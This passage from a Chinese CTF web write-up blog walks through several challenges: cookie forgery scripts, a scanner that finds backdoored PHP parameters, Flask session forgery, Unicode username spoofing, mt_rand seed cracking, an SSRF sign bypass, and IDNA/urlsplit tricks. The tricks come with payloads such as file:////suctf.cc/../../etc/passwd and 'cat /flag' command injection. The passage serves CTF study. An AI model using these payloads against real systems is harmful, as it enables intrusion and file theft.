print(cookie_new)</code></pre><p>运行脚本得到16个base64加密后的值</p><p>按理说原题利用bp是可以爆破的出来的，但是这个题目不知道是环境的问题还是什么原因，后端的user值一直在变，意思是说<code>rnd</code>值一直在变，那md5加密后的<code>key</code>值也会变，脚本就毫无意义，所以无果，还是我哪里理解错了。。。。。先放这里，等我啥时候想明白了，或者哪位大佬告诉我原因了再补上。</p><p>我来填坑了，上面一步我还是理解错了，刷新界面就算会再次执行php脚本，但也会在比较完<code>$username</code>的值后再进入else函数再执行一遍<code>encrypt</code>函数回显一个新的<code>cookie</code>，所以不用考虑<code>user</code>的值会变的问题，因为在他变之前如果我们已经判断出<code>$username</code>==<code>system</code>了，就会成功拿到flag，而后台不会再调用<code>encrypt</code>函数生成新的<code>user</code>，所以这里是没有问题的，但是爆破的时候还是爆破不出来，为什么呢？我可是怀疑我的python脚本</p><p>在网上找个php脚本来执行一下看看二者得出来的base64有什么区别</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php    $txt1 &#x3D; &#39;guest&#39;;    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;        $txt1[$i] &#x3D; chr(ord($txt1[$i])+10);    &#125;    $cookie_guest &#x3D; &#39;emVTQkZHCh8d&#39;;     $cookie_guest &#x3D; base64_decode($cookie_guest);    $rnd &#x3D; substr($cookie_guest,0,4);     $ttmp &#x3D; substr($cookie_guest,4);    $key&#x3D;&#39;&#39;;    for ($i &#x3D; 0; $i &lt; strlen($txt1); $i++) &#123;        $key .&#x3D; ($txt1[$i] ^ $ttmp[$i]);&#x2F;&#x2F;$key&#x3D;md5($rnd.$key);    &#125;    $txt2 &#x3D; &#39;system&#39;;    for ($i &#x3D; 0; $i &lt; strlen($txt2); $i++) &#123;        $txt2[$i] &#x3D; chr(ord($txt2[$i])+10);    &#125;    $md5 &#x3D; &#39;0123456789abcdef&#39;;    for ($i &#x3D; 0; $i &lt; strlen($md5); $i++) &#123;        $key_new &#x3D; $key.$md5[$i];        $cookie_system&#x3D;&#39;&#39;;        for ($j &#x3D; 0; $j &lt; strlen($txt2); $j++) &#123;            $cookie_system .&#x3D; ($key_new[$j] ^ $txt2[$j]);        &#125;        $cookie_system &#x3D; base64_encode($rnd.$cookie_system);        echo $cookie_system.&quot;&lt;&#x2F;br&gt;&quot;;    &#125;  ?&gt;</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220160920767.png" alt loading="lazy"></p><p>发现预期结果和我想的并不一样，但是结果却有几分相似，逐步排查后发现到最后一步我得到的key的6位值和php上的是一样的，但结果经过base64编码后就不一样了，应该是编码的问题，在网上查了一番后发现python3默认把脚本文件用<code>utf-8</code>进行编码，python2用的是<code>ascii</code>（我用的是python3，python2不会出现这种情况），而php对base64编码的函数是好像用的ascii进行编码（应该~，后文验证），于是改用脚本base64编码方式，这里使用<code>Latin1</code>进行编码，<strong>Latin1编码是单字节编码，向下兼容ASCII，</strong>其编码范围是0x00-0xFF，0x00-0x7F之间完全和ASCII一致，0x80-0x9F之间是控制字符，0xA0-0xFF之间是文字符号，<a href="https://blog.csdn.net/BLGT_57/article/details/80848492">详</a></p><pre class="language-python" data-language="python"><code class="language-python">import requestsimport base64session &#x3D; &#39;QlRxaRVPCx5K&#39;txt &#x3D; str(base64.b64decode(session),&quot;Latin1&quot;)rnd &#x3D; txt[0:4]   #拿到rnd的值ttemp &#x3D; txt[4:]guest &#x3D; &#39;guest&#39;tmp &#x3D; &#39;&#39;for i in range(len(guest)):    tmp +&#x3D; chr(ord(guest[i]) + 10)key &#x3D; &#39;&#39;for i in range(len(ttemp)):    key +&#x3D; chr(ord(tmp[i]) ^ ord(ttemp[i]))#拿到keysystem &#x3D; &#39;system&#39;system1 &#x3D; &#39;&#39;for i in range(len(system)):    system1 +&#x3D; chr(ord(system[i]) + 10)md5 &#x3D; &#39;0123456789abcdef&#39;key_new &#x3D; &#39;&#39;cookie_new &#x3D; &#39;&#39;for i in range(len(md5)):    key_new  &#x3D; key + md5[i]    session_new &#x3D; &#39;&#39;    for j in range(len(system1)):        session_new +&#x3D; chr(ord(key_new[j]) ^ ord(system1[j]))    session_new &#x3D; rnd + session_new    cookie_new &#x3D; str(base64.b64encode(session_new.encode(&#39;Latin1&#39;)),&#39;Latin1&#39;)    print(cookie_new)</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162317195.png" alt loading="lazy"></p><p>于是得到的值和php编码出来的完全一致，然后拿到bp中进行爆破拿到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200220162440443.png" alt loading="lazy"></p><p>写脚本的水平实在是太菜了，还得多练才行</p><h2 id="2019强网杯—高明的黑客"><a href="#2019强网杯—高明的黑客" class="headerlink" title="2019强网杯—高明的黑客"></a>2019强网杯—高明的黑客</h2><p>核心————————–python脚本</p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-190.png" alt loading="lazy"></p><p>将源码下载下来解压后发现有3000多个php文件，于是上大佬脚本：</p><pre class="language-python" data-language="python"><code class="language-python">import osimport requestsimport reimport threadingimport timeprint(&#39;开始时间：  &#39;+  time.asctime( time.localtime(time.time()) ))s1&#x3D;threading.Semaphore(100)              #这儿设置最大的线程数filePath &#x3D; r&quot;C:&#x2F;Users&#x2F;71071&#x2F;Desktop&#x2F;src&#x2F;&quot;os.chdir(filePath)                        #改变当前的路径requests.adapters.DEFAULT_RETRIES &#x3D; 5    #设置重连次数，防止线程数过高，断开连接files &#x3D; os.listdir(filePath)session &#x3D; requests.Session()session.keep_alive &#x3D; False                # 设置连接活跃状态为Falsedef get_content(file):    s1.acquire()                                                    print(&#39;trying   &#39;+file+ &#39;     &#39;+ time.asctime( time.localtime(time.time()) ))    with open(file,encoding&#x3D;&#39;utf-8&#39;) as f:    #打开php文件，提取所有的$_GET和$_POST的参数            gets &#x3D; list(re.findall(&#39;\$_GET\[\&#39;(.*?)\&#39;\]&#39;, f.read()))            posts &#x3D; list(re.findall(&#39;\$_POST\[\&#39;(.*?)\&#39;\]&#39;, f.read()))    data &#x3D; &#123;&#125;                            #所有的$_POST    params &#x3D; &#123;&#125;                            #所有的$_GET    for m in gets:        params[m] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;    for n in posts:        data[n] &#x3D; &quot;echo &#39;xxxxxx&#39;;&quot;    url &#x3D; &#39;http:&#x2F;&#x2F;1d941413-1227-4486-890d-581a1eda8638.node3.buuoj.cn&#x2F;&#39;+file    req &#x3D; session.post(url, data&#x3D;data, params&#x3D;params)        #一次性请求所有的GET和POST    req.close()                            # 关闭请求  释放内存    req.encoding &#x3D; &#39;utf-8&#39;    content &#x3D; req.text    #print(content)    if &quot;xxxxxx&quot; in content:                #如果发现有可以利用的参数，继续筛选出具体的参数        flag &#x3D; 0        for a in gets:            req &#x3D; session.get(url+&#39;?%s&#x3D;&#39;%a+&quot;echo &#39;xxxxxx&#39;;&quot;)            content &#x3D; req.text            req.close()                    # 关闭请求  释放内存            if &quot;xxxxxx&quot; in content:                flag &#x3D; 1                break        if flag !&#x3D; 1:            for b in posts:                req &#x3D; session.post(url, data&#x3D;&#123;b:&quot;echo &#39;xxxxxx&#39;;&quot;&#125;)                content &#x3D; req.text                req.close()                # 关闭请求  释放内存                if &quot;xxxxxx&quot; in content:                    break        if flag &#x3D;&#x3D; 1:                   #flag用来判断参数是GET还是POST，如果是GET，flag&#x3D;&#x3D;1，则b未定义；如果是POST，flag为0，            param &#x3D; a        else:            param &#x3D; b        print(&#39;找到了利用文件： &#39;+file+&quot;  and 找到了利用的参数：%s&quot; %param)        print(&#39;结束时间：  &#39; + time.asctime(time.localtime(time.time())))    s1.release()for i in files:                            #加入多线程   t &#x3D; threading.Thread(target&#x3D;get_content, args&#x3D;(i,))   t.start()</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-191.png" alt loading="lazy"></p><p>访问xk0SzyKwfzw.php?Efa5BVG=cat /flag即可得到flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-192.png" alt loading="lazy"></p><h2 id="2018HCTF—admin"><a href="#2018HCTF—admin" class="headerlink" title="2018HCTF—admin"></a>2018HCTF—admin</h2><p>核心------------------------ ①flask session 伪造 ；②unicode欺骗 ，<a href="https://www.codercto.com/a/38179.html">参考</a></p><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-183.png" alt loading="lazy"></p><h3 id="Flask-session-伪造"><a href="#Flask-session-伪造" class="headerlink" title="Flask session 伪造"></a>Flask session 伪造</h3><p>参考文章：</p><ul><li><a href="https://xz.aliyun.com/t/3569">Python Web之flask session&amp;格式化字符串漏洞</a></li><li><a href="https://www.leavesongs.com/PENETRATION/client-session-security.html#">客户端 session 导致的安全问题</a></li></ul><p>在index和change界面的源码处分别有两处提示：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-184.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-185.png" alt loading="lazy"></p><p>可知需要用户为admin才可以拿到flag，下载下来后发现web框架是用<a href="https://baike.baidu.com/item/Flask/1241509?fr=aladdin">flask</a>写的</p><p>解题具体操作如下：</p><p>先注册一个账户：admin1</p><p>在index界面拿到自己的session，进行解码，上大佬脚本</p><pre class="language-python" data-language="python"><code class="language-python">import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig &#x3D; payload.rsplit(b&#39;.&#39;, 1)    payload, timestamp &#x3D; payload.rsplit(b&#39;.&#39;, 1)    decompress &#x3D; False    if payload.startswith(b&#39;.&#39;):        payload &#x3D; payload[1:]        decompress &#x3D; True    try:        payload &#x3D; base64_decode(payload)    except Exception as e:        raise Exception(&#39;Could not base64 decode the payload because of &#39;                         &#39;an exception&#39;)    if decompress:        try:            payload &#x3D; zlib.decompress(payload)        except Exception as e:            raise Exception(&#39;Could not zlib decompress the payload before &#39;                             &#39;decoding the payload&#39;)    return session_json_serializer.loads(payload)if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    print(decryption(sys.argv[1].encode()))</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-187.png" alt loading="lazy"></p><p>在index.html发现只要session[‘name’]==’admin’即可作为admin用户登录，再将解码出来的session中的name改为admin再进行一次编码来伪造admin的session，对session编码需要SECRET_KEY，在config.py处找到，此处用脚本编码，<a href="https://github.com/noraj/flask-session-cookie-manager">脚本git下载地址</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-188.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-186.png" alt loading="lazy"></p><p>将自己的session修改为编码后的session即可得到flag</p><h3 id="Unicode欺骗"><a href="#Unicode欺骗" class="headerlink" title="Unicode欺骗"></a>Unicode欺骗</h3><p>当解题思路断了的时候，不妨结合代码角度思考，前面在改密码界面就感觉到不对，因为密码就直接改不需要验证什么的，于是找到改密码的change函数</p><pre class="language-python" data-language="python"><code class="language-python">@app.route(&#39;&#x2F;change&#39;, methods &#x3D; [&#39;GET&#39;, &#39;POST&#39;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&#39;login&#39;))    form &#x3D; NewpasswordForm()    if request.method &#x3D;&#x3D; &#39;POST&#39;:        name &#x3D; strlower(session[&#39;name&#39;])        user &#x3D; User.query.filter_by(username&#x3D;name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&#39;change successful&#39;)        return redirect(url_for(&#39;index&#39;))    return render_template(&#39;change.html&#39;, title &#x3D; &#39;change&#39;, form &#x3D; form)</code></pre><p>经大佬文章提点，发现在进行改密的时候使用了strlower函数将用户名转成了小写，一般在python中转小写用的都是lower函数，于是跟进strlower函数</p><pre class="language-python" data-language="python"><code class="language-python">def strlower(username):    username &#x3D; nodeprep.prepare(username)    return username</code></pre><p>研究nodeprep.prepare函数，nodeprep是从Twisted模块导入的，在requirements.txt文件中看到Twisted版本与最新版本相差甚远，存在猫腻，<a href="https://panda1g1.github.io/2018/11/15/HCTF%20admin/">参考</a></p><p>于是就有了以下的Unicode编码问题；具体编码方式：<a href="https://unicode-table.com/cn/search/?q=%E4%BF%AE%E9%A5%B0%E5%AD%97%E6%AF%8D%E5%A4%A7%E5%86%99">修饰字母大写</a></p><p>nodeprep.prepare会进行如下操作</p><p>ᴬ-&gt;A-&gt;a;ᴬdmin-&gt;Admin-&gt;admin</p><p>参考：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/ba81f7598149fdce96a3ad74e3ab6ff1.png" alt loading="lazy"></p><p>注册 ᴬdmin ；登录 ᴬdmin ，经过一次strlower变成Admin，修改密码时name又经过一次strlower更改了admin的密码，随后即可以修改后的密码登录拿到flag</p><h2 id="安恒杯-新春祈福赛—枯燥的抽奖"><a href="#安恒杯-新春祈福赛—枯燥的抽奖" class="headerlink" title="安恒杯-新春祈福赛—枯燥的抽奖"></a>安恒杯-新春祈福赛—枯燥的抽奖</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202200452558.png" alt loading="lazy"></p><p>F12发现check.php，访问得到php源码</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show &#x3D; substr($str, 0, 10);echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;);</code></pre><p>发现mt_srand()和mt_rand() 并且session是用随机数设置的</p><p>上爆破工具php_mt_seed和脚本得到随机数种子</p><pre class="language-python" data-language="python"><code class="language-python">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2&#x3D;&#39;cTVM5ZeUkl&#39;length &#x3D; len(str2)res&#x3D;&#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] &#x3D;&#x3D; str1[j]:            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint res</code></pre><p>得到</p><pre class="language-shell" data-language="shell"><code class="language-shell">2 2 0 61 55 55 0 61 57 57 0 61 48 48 0 61 31 31 0 61 61 61 0 61 4 4 0 61 56 56 0 61 10 10 0 61 11 11 0 61</code></pre><p>爆破</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202201906349.png" alt loading="lazy"></p><p>将得到的随机种子放到php脚本中</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpmt_srand(654818272);$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str&#x3D;&#39;&#39;;$len1&#x3D;20;for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1); &#125;echo $str;?&gt;</code></pre><p>得到字符串</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200202202206918.png" alt loading="lazy"></p><h2 id="De1CTF-2019—SSRF-Me"><a href="#De1CTF-2019—SSRF-Me" class="headerlink" title="De1CTF-2019—SSRF Me"></a>De1CTF-2019—SSRF Me</h2><p>点开链接得到源码</p><pre class="language-python" data-language="python"><code class="language-python">#! &#x2F;usr&#x2F;bin&#x2F;env python#encoding&#x3D;utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#39;latin1&#39;)app &#x3D; Flask(__name__)secert_key &#x3D; os.urandom(16)class Task:    def __init__(self, action, param, sign, ip):#python的构造方法        self.action &#x3D; action        self.param &#x3D; param        self.sign &#x3D; sign        self.sandbox &#x3D; md5(ip)        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr            os.mkdir(self.sandbox)    def Exec(self):                       #定义的命令执行函数，此处调用了scan这个自定义的函数        result &#x3D; &#123;&#125;        result[&#39;code&#39;] &#x3D; 500        if (self.checkSign()):            if &quot;scan&quot; in self.action:#action要写scan                tmpfile &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;w&#39;)                resp &#x3D; scan(self.param)   #文件读取                if (resp &#x3D;&#x3D; &quot;Connection Timeout&quot;):                    result[&#39;data&#39;] &#x3D; resp                else:                    print resp            #输出结果                    tmpfile.write(resp)                    tmpfile.close()                result[&#39;code&#39;] &#x3D; 200            if &quot;read&quot; in self.action:#action要加read                f &#x3D; open(&quot;.&#x2F;%s&#x2F;result.txt&quot; % self.sandbox, &#39;r&#39;)                result[&#39;code&#39;] &#x3D; 200                result[&#39;data&#39;] &#x3D; f.read()            if result[&#39;code&#39;] &#x3D;&#x3D; 500:                result[&#39;data&#39;] &#x3D; &quot;Action Error&quot;        else:            result[&#39;code&#39;] &#x3D; 500            result[&#39;msg&#39;] &#x3D; &quot;Sign Error&quot;        return result    def checkSign(self):        if (getSign(self.action, self.param) &#x3D;&#x3D; self.sign): #!!!校验            return True        else:            return False#generate Sign For Action Scan.@app.route(&quot;&#x2F;geneSign&quot;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) #用于测试def geneSign():    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))     action &#x3D; &quot;scan&quot;    return getSign(action, param)@app.route(&#39;&#x2F;De1ta&#39;,methods&#x3D;[&#39;GET&#39;,&#39;POST&#39;])#实际注入def challenge():    action &#x3D; urllib.unquote(request.cookies.get(&quot;action&quot;))    param &#x3D; urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;))    sign &#x3D; urllib.unquote(request.cookies.get(&quot;sign&quot;))    ip &#x3D; request.remote_addr   #获取用户ip    if(waf(param)):        return &quot;No Hacker!!!!&quot;    task &#x3D; Task(action, param, sign, ip)    return json.dumps(task.Exec())@app.route(&#39;&#x2F;&#39;)#根目录路由def index():    return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param):#这是用来扫目录的函数    socket.setdefaulttimeout(1)    try:        return urllib.urlopen(param).read()[:50]    except:        return &quot;Connection Timeout&quot;def getSign(action, param):#MD5计算,此处注意顺序先是param后是action    return hashlib.md5(secert_key + param + action).hexdigest()def md5(content):    return hashlib.md5(content).hexdigest()def waf(param):#无用的waf    check&#x3D;param.strip().lower()    if check.startswith(&quot;gopher&quot;) or check.startswith(&quot;file&quot;):        return True    else:        return Falseif __name__ &#x3D;&#x3D; &#39;__main__&#39;:    app.debug &#x3D; False    app.run(host&#x3D;&#39;0.0.0.0&#39;)</code></pre><p>是一个利用flask框架搭的，有两个路由分别是<code>geneSign</code>和<code>De1ta</code></p><p>首先来读代码<code>geneSign</code>是用来计算传入的<code>param</code>+scan的md5值，应该是用于测试的</p><p><code>De1ta</code>分别可传入一个<code>get</code>参数<code>param</code>，两个<code>cookie</code>参数<code>action</code>和<code>sign</code>，并且<code>param</code>参数套了一层<code>waf</code></p><p>随后建立<code>Task</code>类使用<code>Exec</code>方法，在看看<code>Task</code>类是用来干什么的</p><p>里面可以<code>print</code>出<code>scan</code>方法后<code>param</code>的结果，根据题目提示<code>flag is in ./flag.txt</code>应该是让我们去想办法读取到flag文件然后输出</p><p>再看到<code>Exec</code>方法的第一个if，引用了<code>checkSign</code>方法，进行md5值的比较，这里是肯定要想办法绕过的了，问题是怎么绕？可以看到后面的if语句，如果我们想要读到<code>flag</code>，就需要让<code>action</code>中有<code>read</code>和<code>scan</code></p><p>再看到<code>geneSign</code>路由，里面固定死了<code>action</code>的值为<code>scan</code>，我们可以传入<code>param</code>的值来得到md5值</p><p>于是设想，如果<code>param</code>=<code>flag.txtread</code>，那么计算出来的md5值就是<code>flag.txtreadscan</code>的md5值，注意<code>getSign</code>方法虽然参数顺序不一样但是在函数中参数还是调了回来，我们将得到的md5赋给<code>sign</code>，再令<code>param</code>=<code>flag.txt</code>,<code>action</code>=<code>readscan</code>，那么<code>checkSign</code>不就可以返回<code>True</code>成功了比较吗，于是得到payload：</p><pre class="language-none"><code class="language-none">param&#x3D;flag.txtaction&#x3D;readscan;sign&#x3D;8bdad5e249bb114a8874247817be9bad</code></pre><p>抓包传入即可得到flag</p><h1 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h1><h2 id="SUCTF-2019—Pythonginx"><a href="#SUCTF-2019—Pythonginx" class="headerlink" title="SUCTF-2019—Pythonginx"></a>SUCTF-2019—Pythonginx</h2><p>首先看到题目给出的源码：</p><pre class="language-python" data-language="python"><code class="language-python">@app.route(&#39;&#x2F;getUrl&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;])def getUrl():    url &#x3D; request.args.get(&quot;url&quot;)    host &#x3D; parse.urlparse(url).hostname    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return &quot;我扌 your problem? 111&quot;    parts &#x3D; list(urlsplit(url))    host &#x3D; parts[1]    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return &quot;我扌 your problem? 222 &quot; + host    newhost &#x3D; []    for h in host.split(&#39;.&#39;):        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))    parts[1] &#x3D; &#39;.&#39;.join(newhost)    #去掉 url 中的空格    finalUrl &#x3D; urlunsplit(parts).split(&#39; &#39;)[0]    host &#x3D; parse.urlparse(finalUrl).hostname    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return urllib.request.urlopen(finalUrl).read()    else:        return &quot;我扌 your problem? 333&quot;</code></pre><p>我们可以传入url参数，要绕过前连两次<code>if</code>的判断也就是<code>host!=suctf.cc</code>，在最后一次要等于，就可以进行<code>urlopen(finalUrl).read()</code>文件读取的操作，推测是要我们进行文件读取</p><p><strong>Nginx下的重要文件位置</strong></p><pre class="language-none"><code class="language-none">配置文件存放目录：&#x2F;etc&#x2F;nginx主配置文件：&#x2F;etc&#x2F;nginx&#x2F;conf&#x2F;nginx.conf管理脚本：&#x2F;usr&#x2F;lib64&#x2F;systemd&#x2F;system&#x2F;nginx.service模块：&#x2F;usr&#x2F;lisb64&#x2F;nginx&#x2F;modules应用程序：&#x2F;usr&#x2F;sbin&#x2F;nginx程序默认存放位置：&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html日志默认存放位置：&#x2F;var&#x2F;log&#x2F;nginx配置文件目录为：&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</code></pre><p>这里就要想办法如何绕过前面的两个if，而在第三个if的时候又要判断通过，可以看到在最后一个if语句的前面有这样的一个操作：<code>newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))</code>，先对里面的字符进行了<code>idna</code>编码，随后有进行了<code>utf-8</code>解码，详情<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">参考</a></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428121257327.png" alt="image-20200428121257327" loading="lazy"></p><p>大概意思就是通过这样的编码就可以对传入的数据进行绕过</p><p>于是用脚本进行测试</p><pre class="language-python" data-language="python"><code class="language-python">from urllib.parse import urlparse,urlunsplit,urlsplitfrom urllib import parsedef get_unicode():    for x in range(65536):        uni&#x3D;chr(x)        url&#x3D;&quot;http:&#x2F;&#x2F;suctf.c&#123;&#125;&quot;.format(uni)        try:            if getUrl(url):                print(&quot;str: &quot;+uni+&#39; unicode: \\u&#39;+str(hex(x))[2:])        except:            passdef getUrl(url):    url&#x3D;url    host&#x3D;parse.urlparse(url).hostname    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return False    parts&#x3D;list(urlsplit(url))    host&#x3D;parts[1]    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return False    newhost&#x3D;[]    for h in host.split(&#39;.&#39;):        newhost.append(h.encode(&#39;idna&#39;).decode(&#39;utf-8&#39;))    parts[1]&#x3D;&#39;.&#39;.join(newhost)    finalUrl&#x3D;urlunsplit(parts).split(&#39; &#39;)[0]    host&#x3D;parse.urlparse(finalUrl).hostname    if host &#x3D;&#x3D; &#39;suctf.cc&#39;:        return True    else:        return Falseif __name__&#x3D;&#x3D;&#39;__main__&#39;:    get_unicode()</code></pre><p>得出如下结果：</p><pre class="language-none"><code class="language-none">str: ℂ unicode: \u2102str: Ⅽ unicode: \u216dstr: ⅽ unicode: \u217dstr: Ⓒ unicode: \u24b8str: ⓒ unicode: \u24d2str: Ｃ unicode: \uff23str: ｃ unicode: \uff43</code></pre><p>传入读取文件即可</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200428122756772.png" alt="image-20200428122756772" loading="lazy"></p><p>另外还有一种用<code>℆</code>字符进行的读法：</p><p><code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>==经过编码==&gt;<code>file://suctf.cc/usr/local/nginx/conf/nginx.conf</code>，将c和u都给补全了，这样也可以读取到文件内容</p><p>另外这里还有个非预期解利用的是<code>CVE-2019-9636</code>，利用的是<code>urlsplit不处理NFKC标准化</code>，payload：<code>file:////suctf.cc/../../../../../etc/passwd</code>，资料较少，利用的似乎是那四个斜杠</p><p><code>list(urllib.parse.urlsplit(&quot;file:////suctf.cc/../../../../../etc/passwd&quot;))</code>=<code>[&#39;file&#39;, &#39;&#39;, &#39;//suctf.cc/../../../../../etc/passwd&#39;, &#39;&#39;, &#39;&#39;]</code>，这样一来第二个值就不是原来的<code>hostname</code>而是空，即可绕过前两个if判断，漏洞利用条件：</p><pre class="language-none"><code class="language-none">Python Python &gt;&#x3D;2.7.x，&lt;&#x3D;2.7.16Python Python &gt;&#x3D;3.x，&lt;&#x3D;3.7.2</code></pre><h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%85%B6%E5%AE%83/image-20200502184210541.png" alt loading="lazy"></p><p>可以看到应该是叫我们买独角兽，而且肯定是要买最贵的那个</p><p>首先输入<code>4</code>和<code>1337.0</code>提示<code>Only one char(?) allowed!</code>只能输入一个字符，在试一下发现报错页面代码：</p><pre class="language-python" data-language="python"><code class="language-python">Traceback (most recent call last):  File &quot;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;site-packages&#x2F;tornado&#x2F;web.py&quot;, line 1541, in _execute    result &#x3D; method(*self.path_args, **self.path_kwargs)  File &quot;&#x2F;app&#x2F;sshop&#x2F;views&#x2F;Shop.py&quot;, line 34, in post    unicodedata.numeric(price)TypeError: need a single Unicode character as parameter</code></pre><p>需要一个Unicode字符作为参数，再回到前面看看源码，有提示：</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--Ah,really important,seriously. --></span></code></pre><p>于是我们寻找到比1337大的<code>Unicode</code>字符<code>U+4E07</code>，<code>utf-8</code>编码后的16进制为<code>E4 B8 87</code>，在前面加入<code>%</code>得到<code>%E4%B8%87</code>传入即可</p><h1 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title="PHP弱类型"></a>PHP弱类型</h1><h2 id="安恒月赛—web2-hash"><a href="#安恒月赛—web2-hash" class="headerlink" title="安恒月赛—web2_hash"></a>安恒月赛—web2_hash</h2><p>本题参考：</p><blockquote><p><a href="https://www.gem-love.com/ctf/1799.html#web2_hash">2020二月安恒月赛抗疫练习赛web题目writeup</a><br><a href="https://xz.aliyun.com/t/4741#toc-7">2019掘安杯web7 writeup</a><br><a href="https://xz.aliyun.com/t/2232">第二届强网杯 MD5碰撞 writeup</a></p></blockquote><p>进来先看界面代码：</p><pre class="language-php" data-language="php"><code 